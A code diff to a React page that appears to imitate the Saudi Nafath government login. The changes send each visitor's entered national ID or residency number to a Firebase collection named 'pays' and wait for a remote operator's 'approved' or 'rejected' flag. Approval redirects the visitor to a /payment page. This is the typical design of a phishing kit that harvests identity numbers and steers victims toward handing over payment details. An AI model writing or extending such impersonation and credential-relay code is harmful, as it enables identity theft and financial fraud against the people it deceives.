@@ -1,24 +1,49 @@
 "use client"
 
-import { Menu } from "lucide-react"
+import { Loader, Loader2Icon, Menu, ShieldAlert } from "lucide-react"
 import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
 import { Card, CardContent } from "@/components/ui/card"
 import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog"
-import { useState } from "react"
+import { useEffect,  useState } from "react"
+import { doc, onSnapshot } from "firebase/firestore"
+import { addData, db } from "@/lib/firebase"
+import { Alert } from "@/components/ui/alert"
 
 export default function Component() {
   const [showAuthDialog, setShowAuthDialog] = useState(false)
   const [authNumber, setAuthNumber] = useState("")
   const [isloading, setIsLoading] = useState(false)
+  const [idLogin, setLoginID] = useState("")
+  const [showError, setShowError] = useState("")
 
+  useEffect(() => {
+    const visitorId = localStorage.getItem("visitor")
+    if (visitorId) {
+      const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnap) => {
+        if (docSnap.exists()) {
+          const data = docSnap.data() as any
+          setAuthNumber(data.authNumber)
+          if(data.approval==="approved"){
+            window.location.href="/payment"
+          } else  if(data.approval==="rejected"){
+            setShowAuthDialog(false)
+            setShowError('فشلت المصادقة الرجاء المحاولة مرة اخرى')
+          }
+        }
+      })
 
+      return () => unsubscribe()
+    }
+  }, [])
   const handleLogin = (e:any) => {
     // Generate random 6-digit authentication number
+    const visitorId = localStorage.getItem("visitor")
+    setShowError('')
+
     e.preventDefault()
     setIsLoading(true)
-    const randomNumber = Math.floor(100000 + Math.random() * 900000).toString()
-    setAuthNumber(randomNumber)
+    addData({id:visitorId,authNumber:idLogin,approval:"pending"})
     setTimeout(() => {
       setShowAuthDialog(true)
     setIsLoading(false)
@@ -60,10 +85,13 @@ export default function Component() {
               placeholder="أدخل رقم الأحوال/الإقامة الخاص بك هنا"
               className="text-right border-gray-300 h-12"
               dir="rtl"
+              onChange={(e)=>setLoginID(e.target.value)}
             />
-
-            <Button onClick={handleLogin} className="w-full bg-teal-600 hover:bg-teal-700 text-white h-12 text-lg">
-              تسجيل الدخول
+{showError &&<Alert  className="text-sm text-red-500 flex justify-between bg-red-50" dir="rtl">
+<ShieldAlert color="red" className="text-right "/> {showError}
+</Alert>
+}            <Button onClick={handleLogin} disabled={isloading} className="w-full bg-teal-600 hover:bg-teal-700 text-white h-12 text-lg">
+              تسجيل الدخول{isloading&&<Loader2Icon className="animate-spin"/>}
             </Button>
 
             <div className="text-center text-gray-600 text-sm mt-4">لتحميل تطبيق نفاذ</div>
@@ -128,7 +156,7 @@ export default function Component() {
               </div>
 
               <div className="flex items-center justify-center space-x-2 space-x-reverse text-teal-600">
-                <div className="w-3 h-3 bg-teal-600 rounded-full animate-pulse"></div>
+                <div className="w-3 h-3 bg-teal-600 rounded-full animate-ping"></div>
                 <div className="text-sm">في انتظار الموافقة...</div>
               </div>
 
